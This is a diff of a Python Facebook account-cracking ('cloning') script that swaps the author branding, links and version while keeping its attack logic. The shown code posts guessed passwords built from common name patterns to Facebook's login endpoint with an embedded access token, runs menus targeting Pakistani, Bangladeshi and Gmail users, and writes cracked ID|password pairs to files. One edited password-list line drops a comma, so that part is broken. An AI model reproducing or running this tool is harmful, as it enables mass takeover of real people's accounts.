@@ -221,11 +221,11 @@ logo=("""
 / /\/\ \ (_| | _\ \ (_| | |_) | |_) | | |    _\ \ |    
 \/    \/\__,_| \__/\__,_|_.__/|_.__/|_|_|    \__/_|    
                                                        
-BEST-FRND : ISHA-GULL \033[0m\033[1;37m
+BEST-FRND :😎 MdSabbir😎 \033[0m\033[1;37m
 \033[1;37;1m-----------------------------------------------
 \033[1;37;1m ▶ Author   : Md Sabbir Bhai
-\033[1;37;1m ▶ Facebook : https://www.facebook.com/profile.php?id=100089747571096&mibextid=ZbWKwL
-\033[1;37;1m ▶ Virson   : 10.0
+\033[1;37;1m ▶ Facebook :MdSabbir Sr.
+\033[1;37;1m ▶ Virson   : 20.0
 \033[1;37;1m-----------------------------------------------""" )
 def my_main():
     os.system("clear")
@@ -356,7 +356,7 @@ def cloning_two():
             data={"adid": "dee1a988-b9d1-4e29-800b-c9cb0ab39dff", "format": "json", "device_id": "402f0ad7-cd8b-4164-81c6-15716182886d", "cpl": "true", "family_device_id": "f3a6ac5b-2985-4d4e-a82c-a0af360c703d", "credentials_type": "device_based_login_password", "email": " TESTING", "password": " TEST", "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32", "generate_session_cookies": "1", "meta_inf_fbmeta": "", "advertiser_id": "67a8ca05-cdc1-46f5-80bc-ec650a279fdc", "currently_logged_in_userid": "0", "locale": "id_ID", "client_country_code": "PK", "method": "auth.login", "fb_api_req_friendly_name": "authenticate", "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler", "api_key": "882a8490361qa98702bf97a021ddc14d"}         
             response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
             if 'session_key' in response.text:
-                print('\r{}\033[1;92m [SAQIB-OK] {} {} {} {}'.format(G, url, fax, px, mys))
+                print('\r{}\033[1;92m [MdsabbirBhai😎-OK] {} {} {} {}'.format(G, url, fax, px, mys))
                 open('/sdcard/ok.txt','a').write(f'{url}|{px}\n')
                 oku.append(url)
                 break
@@ -371,13 +371,13 @@ def cloning_two():
             else:
                 #print(response.text)
                 continue
-        sys.stdout.write('\r {} [SAQIB] [{}|{}] [OK:{}] {}\r'.format(mys, str(loop), str(len(idx)), str(len(oku)) ,mys))
+        sys.stdout.write('\r {} [Md Sabbir Bhai,😎] [{}|{}] [OK:{}] {}\r'.format(mys, str(loop), str(len(idx)), str(len(oku)) ,mys))
         sys.stdout.flush()
         loop += 1       
     with tpe(max_workers=30) as tp:
         tp.map(rana, idx)
     print("\n-----------------------------------------------")
-    print(" [•] If You Enjoy Send Feeback")
+    print(" [•] hey guys You Enjoy Send Feeback")
     print("-----------------------------------------------  ")
     exit()
 def l1():
@@ -438,7 +438,7 @@ def menu():
 				#pass
 			elif xd in ['3','03']:
 				clear()
-				print(' [1] Pakistan cloning\n [2] Bangladesh cloning\n [3] Gmail cloning\n [0] Back menu')
+				print(' [1] 🇵🇰Pakistan cloning\n [2] 🇧🇩Bangladesh cloning\n [3]✉️ Gmail cloning\n [0] Back menu')
 				l1()
 				x=input(' [+] Choose: ')
 				if x in ['1','01']:
@@ -450,9 +450,9 @@ def menu():
 				else:
 					menu()
 			elif xd in ['5','05']:
-				os.system(f'xdg-open https://chat.whatsapp.com/E33jZUchJWiD2AeQ40C4qm');menu()
+				os.system(f'xdg-open https://chat.whatsapp.com/EkWTPemPvC5CoWkeJrTO1v');menu()
 			elif xd in ['0','00']:
-				exit(' [•] If You Enjoy This Tool Share Your Opinion')
+				exit(' [•] Hey guys You Enjoy This Tool Share Your Opinion')
 			else:
 				exit(' Option not found in menu...')
 def pak():
@@ -480,10 +480,10 @@ def pak():
                                 Aking.submit(rndm,ids,passlist)
                 print('\033[1;37m')             
                 print(' The process has completed')
-                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
+                print(' Total OK😍/CP🥹/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                 l1()
                 input(' Press enter to back ')
-   #             os.system('python AKING.py')
+   #             os.system('python darki.py')
 def bd():
                 user=[]
                 clear()
@@ -513,7 +513,7 @@ def bd():
                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                 l1()
                 input(' Press enter to back ')
-         #       os.system('python AKING.py')
+         #       os.system('python Darki.py')
 def gmail():
                 os.system('rm -rf .re.txt');os.system('clear');print(logo)  
                 print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
@@ -559,17 +559,17 @@ def gmail():
                                         last_name = 'Khan'
                                 fs = first_name.lower()
                                 ls = last_name.lower()
-                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12',fs+'@123',fs+'@1234',fs+'@12345']
+                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12',fs+'@123',fs+'@1234',fs+'@12345' fs+'@11223']
                                 Aking.submit(rndm,ids,passlist)
                 print('\033[1;37m')             
                 print(' The process has completed')
-                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
+                print(' Total OK😍/CP🥹/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                 l1()
-                input(' Press enter to back ')
+                input(' Press enter to back⏪ ')
 def rndm(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [ SAQIB ] [%s] [\033[1;37mOK : %s ] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [ Md Sabbir Bhai] [%s] [\033[1;37mOK : %s ] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -642,7 +642,7 @@ def rndm(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [SAQIB-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [Md Sabbir Bhai 😎-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         open('/sdcard/KINGOK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
